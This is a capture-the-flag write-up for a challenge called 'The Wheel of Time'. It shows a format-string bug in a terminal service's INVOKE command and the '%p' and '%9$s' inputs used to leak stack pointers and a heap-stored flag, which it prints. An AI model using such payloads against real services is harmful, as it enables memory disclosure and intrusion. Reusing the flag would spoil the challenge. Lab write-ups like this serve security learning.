# The Wheel of Time

## Summary

The service is an interactive terminal with a vulnerable `INVOKE <offering>` command in the first realm, `MORTAL`.

`INVOKE` reflects user input with an uncontrolled format string, so `%p` and `%s` specifiers are interpreted by `printf` instead of being printed literally.

## Recon

Connecting to the service shows:

```text
[REALM: MORTAL] You stand at the first gate.
[MORTAL] Commands: PRAY | INVOKE <offering> | SEEK <token> | QUIT
```

Running `PRAY` gives the hint:

```text
[MORTAL] Memory is not as private as you think.
[MORTAL] Perhaps your offering to INVOKE could reveal more than words
```

That strongly suggests a format-string issue.

## Exploit

First confirm the bug:

```text
INVOKE %p %p %p %p
0x7ffc02521750 0x5c36d81ec2d0 (nil) (nil)
```

Then switch from pointer leaks to string leaks:

```text
INVOKE %9$s
Kaal{gh0st_p4g3_vbs_byp4ss_4slr_pwn3d}
```

The ninth stack argument points to a heap string containing the flag. No further realm traversal is required once the flag is leaked.

## Flag

```text
Kaal{gh0st_p4g3_vbs_byp4ss_4slr_pwn3d}
```
